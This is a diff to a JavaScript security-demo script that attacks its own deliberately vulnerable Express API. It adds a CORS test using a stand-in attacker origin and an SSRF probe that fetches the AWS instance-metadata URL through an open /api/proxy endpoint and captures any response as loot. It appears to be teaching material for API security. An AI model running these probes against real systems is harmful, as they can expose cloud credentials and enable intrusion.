@@ -486,7 +486,7 @@ async function phaseReset() {
   if (res.status === 200 && res.json?.ok) {
     ok("Demo DB re-seeded (Alice/Bob/admin clean)");
   } else {
-    info(`Reset → ${res.status} (hardened mode has no reset; or DEMO_RESET_TOKEN required)`);
+    info(`Reset → ${res.status} (DEMO_RESET_TOKEN may be required)`);
   }
   await dramaPause();
 }
@@ -497,12 +497,7 @@ async function phaseRecon() {
   try {
     const health = await http("GET", "/api/health", { label: "health-check" });
     if (health.status === 200) {
-      ok(
-        `API is up: service=${health.json?.service || "?"} hardened=${health.json?.hardened === true ? "YES" : "no"} time=${health.json?.time || "?"}`
-      );
-      if (health.json?.hardened === true) {
-        narrate("Target reports hardened=true — expect the green run (0 critical).");
-      }
+      ok(`API is up: service=${health.json?.service || "?"} time=${health.json?.time || "?"}`);
     } else {
       const root = await http("GET", "/", { label: "root-fallback" });
       if (root.status >= 200 && root.status < 500) ok(`Root answered ${root.status}`);
@@ -563,6 +558,43 @@ async function phaseMissingSecurityHeaders() {
     );
   } else {
     ok(`Most security headers present (${needed.length - missing.length}/${needed.length})`);
+  }
+  await dramaPause();
+}
+
+/**
+ * CORS misconfig: this demo added the cors package with origin "*".
+ * Bare Express ships no CORS middleware at all — not "allow all by default".
+ */
+async function phaseCorsMisconfig() {
+  step("CORS misconfig — any Origin allowed (no login)");
+  intent(
+    "Browser cross-origin: if Access-Control-Allow-Origin is * (or echoes any Origin), any website can call this API. Bare Express has no CORS; this app added cors({ origin: '*' })."
+  );
+  const evilOrigin = "https://evil-attacker.example";
+  narrate(`GET /api/health with Origin: ${evilOrigin}…`);
+  const res = await http("GET", "/api/health", {
+    label: "cors-origin",
+    headers: { Origin: evilOrigin },
+  });
+  const acao = res.headers["access-control-allow-origin"] || "";
+  const acac = res.headers["access-control-allow-credentials"] || "";
+  if (acao === "*" || acao === evilOrigin) {
+    bad(`CORS allows attacker origin → Access-Control-Allow-Origin: ${acao}`);
+    loot("ACA-Origin", acao);
+    if (acac) loot("ACA-Credentials", acac);
+    record(
+      "HIGH",
+      "CORS misconfig allows any browser origin",
+      acao === "*"
+        ? "cors package with origin: '*' — not an Express default (bare Express has no CORS). Any site can read API responses from a victim browser session if cookies/auth apply."
+        : `Reflects Origin ${evilOrigin} — effectively open CORS for any site that sends Origin.`,
+      { kind: "misconfig", owasp: "API8" }
+    );
+  } else if (!acao) {
+    ok("No Access-Control-Allow-Origin for foreign Origin (CORS not open to evil.example)");
+  } else {
+    ok(`CORS restricted (ACA-Origin=${acao})`);
   }
   await dramaPause();
 }
@@ -737,9 +769,103 @@ async function phaseOpenRedirect() {
   await dramaPause();
 }
 
+/** Classic cloud IMDS URL (demo teaching target — may fail on CF/Vercel). */
+const AWS_IMDS_URL = "http://169.254.169.254/latest/meta-data/";
+
+/**
+ * Probe unrestricted egress via /api/proxy (SSRF / cloud-metadata class).
+ * Call after self/external. Honest: CF/Vercel often lack IMDS; finding is "no egress policy" when proxy exists.
+ * @param {{ proxyAlive: boolean }} opts - false when /api/proxy is missing
+ */
+async function probeMetadataEgress(opts = { proxyAlive: true }) {
+  if (!opts.proxyAlive) {
+    info("Skipping IMDS probe — open proxy endpoint not available");
+    return;
+  }
+  narrate(
+    `Cloud-metadata style egress: open-proxy fetch of ${AWS_IMDS_URL} (classic EC2 IMDS — teaching target)…`
+  );
+  let meta;
+  try {
+    meta = await http("GET", `/api/proxy?url=${encodeURIComponent(AWS_IMDS_URL)}`, {
+      timeoutMs: 8_000,
+      label: "ssrf-imds",
+    });
+  } catch (err) {
+    info(`IMDS probe transport error: ${err.message}`);
+    record(
+      "HIGH",
+      "Open proxy accepted cloud-metadata URL (egress unrestricted)",
+      "App attempted server-side fetch of 169.254.169.254 via /api/proxy. No link-local/private allowlist. Transport failed off-box — class still applies on EC2/IMDSv1.",
+      { kind: "junior-code", owasp: "API7" }
+    );
+    notePlatform(
+      "Cloud-metadata probe did not return IMDS data (expected off EC2)",
+      "Link-local egress often fails on Workers/Vercel. Same open proxy still fetches other URLs."
+    );
+    return;
+  }
+
+  const body = (meta.text || "").replace(/\s+/g, " ").trim();
+  // Upstream errors from our proxy are usually JSON { error, detail } with 502.
+  const proxyReportedFail =
+    meta.status === 502 ||
+    meta.status === 400 ||
+    /Upstream fetch failed|ENOTFOUND|ECONNREFUSED|timeout|EHOSTUNREACH|ECONNRESET/i.test(body);
+
+  const looksLikeImds =
+    meta.status === 200 &&
+    body.length > 0 &&
+    !proxyReportedFail &&
+    (/ami-id|instance-id|iam\/|meta-data|local-ipv4|public-ipv4|hostname/i.test(body) ||
+      /^(ami-|i-)[a-z0-9-]+/i.test(body));
+
+  if (looksLikeImds) {
+    bad("Open proxy reached link-local metadata endpoint — credential theft class");
+    loot("imds-snippet", body.slice(0, 160));
+    record(
+      "CRITICAL",
+      "SSRF open proxy can reach cloud instance metadata",
+      "Server fetched 169.254.169.254 (IMDS). On EC2/IMDSv1 this class yields instance role credentials. No egress allowlist on /api/proxy.",
+      { kind: "junior-code", owasp: "API7" }
+    );
+    return;
+  }
+
+  if (meta.status === 200 && body.length > 20 && !proxyReportedFail) {
+    bad(`Metadata URL returned HTTP 200 (${body.length} B) — may not be real IMDS; egress still open`);
+    loot("imds-body", body.slice(0, 120));
+    record(
+      "HIGH",
+      "Open proxy accepted cloud-metadata URL (egress unrestricted)",
+      "GET /api/proxy?url=http://169.254.169.254/... was allowed through the app. Response may not be real IMDS on serverless — the bug is unrestricted server-side fetch.",
+      { kind: "junior-code", owasp: "API7" }
+    );
+    return;
+  }
+
+  // Proxy accepted the request path; upstream failed or empty — still "no allowlist" on vulnerable apps.
+  info(
+    `IMDS probe → status=${meta.status} (often fail on Workers/Vercel — not EC2). Class: open proxy has no private/link-local block.`
+  );
+  record(
+    "HIGH",
+    "Open proxy has no egress allowlist (metadata-class URL not blocked at app)",
+    "Requested classic AWS IMDS URL via /api/proxy. App did not refuse link-local/private ranges; runtime/upstream failed or has no IMDS. On a misconfigured VM the same hole reaches 169.254.169.254.",
+    { kind: "junior-code", owasp: "API7" }
+  );
+  notePlatform(
+    "Cloud-metadata probe did not return IMDS data (expected off EC2)",
+    "Platform/runtime may refuse link-local egress. App still exposes unrestricted /api/proxy for other URLs."
+  );
+}
+
 async function phaseSsrfProxy() {
   step("Open proxy / SSRF on /api/proxy (no login)");
-  intent("Junior open proxy: server fetch(user URL). No SSRF guard in Express core.");
+  intent(
+    "Unrestricted server-side fetch(user URL): self-hit, arbitrary external, and cloud-metadata class. No egress policy in Express core — you must add one."
+  );
+  let proxyAlive = true;
   const loop = `${BASE}/api/debug/config`;
   narrate(`Asking the server to fetch its own debug config: ${loop}`);
   const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`, {
@@ -761,7 +887,7 @@ async function phaseSsrfProxy() {
     record(
       "CRITICAL",
       "SSRF open proxy can reach internal URLs",
-      "Junior fetch(user URL) — Express has no built-in SSRF guard",
+      "fetch(user URL) with no allowlist — Express has no built-in SSRF guard",
       { kind: "junior-code", owasp: "API7" }
     );
   } else if (res.status === 200) {
@@ -770,15 +896,11 @@ async function phaseSsrfProxy() {
       kind: "junior-code",
       owasp: "API7",
     });
-  } else if (
-    res.status === 404 &&
-    /error code:\s*1042/i.test(res.text || "")
-  ) {
+  } else if (res.status === 404 && /error code:\s*1042/i.test(res.text || "")) {
     notePlatform(
       "Self-fetch blocked by Cloudflare (error 1042) — not app authz",
       "Workers often refuse same-origin/self subrequests. The /api/proxy hole may still work for other URLs."
     );
-    // Prove the open proxy is still real with a harmless external target.
     const external = "https://example.com/";
     narrate(`Fallback: open-proxy fetch of ${external}…`);
     const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
@@ -791,12 +913,15 @@ async function phaseSsrfProxy() {
       record(
         "HIGH",
         "Open proxy: server fetches arbitrary URLs (SSRF surface)",
-        "Self-target blocked by CF 1042; external target succeeded — junior open proxy, not a framework feature",
+        "Self-target blocked by CF 1042; external target succeeded — open proxy, not a framework feature",
         { kind: "junior-code", owasp: "API7" }
       );
     } else {
       info(`External proxy probe → ${ext.status} (self still CF-blocked)`);
     }
+  } else if (res.status === 404 && /not found/i.test(res.text || "")) {
+    ok("Open proxy route disabled (404)");
+    proxyAlive = false;
   } else {
     info(`Self-proxy probe → ${res.status}`);
     const external = "https://example.com/";
@@ -810,13 +935,18 @@ async function phaseSsrfProxy() {
       record(
         "HIGH",
         "Open proxy: server fetches arbitrary URLs (SSRF surface)",
-        "Junior-coded /api/proxy with no allowlist",
+        "App /api/proxy with no allowlist",
         { kind: "junior-code", owasp: "API7" }
       );
+    } else if (ext.status === 404) {
+      proxyAlive = false;
+      ok("Open proxy route disabled (404)");
     } else {
       info(`External proxy probe → ${ext.status}`);
     }
   }
+
+  await probeMetadataEgress({ proxyAlive });
   await dramaPause();
 }
 
@@ -1388,7 +1518,7 @@ ${c.bold}${c.red}╔════════════════════
     );
   } else {
     console.log(
-      `${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical · ${reqSeq} requests · ${elapsedSec}s — green run (or unexpected)  ${c.reset}\n`
+      `${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical · ${reqSeq} requests · ${elapsedSec}s (unexpected for this demo)  ${c.reset}\n`
     );
   }
 }
@@ -1398,6 +1528,7 @@ async function main() {
   await phaseReset();
   await phaseRecon();
   await phaseMissingSecurityHeaders();
+  await phaseCorsMisconfig();
   await phaseBodyLimit();
   await phaseNoRateLimitFlood();
   await phasePathTraversal();
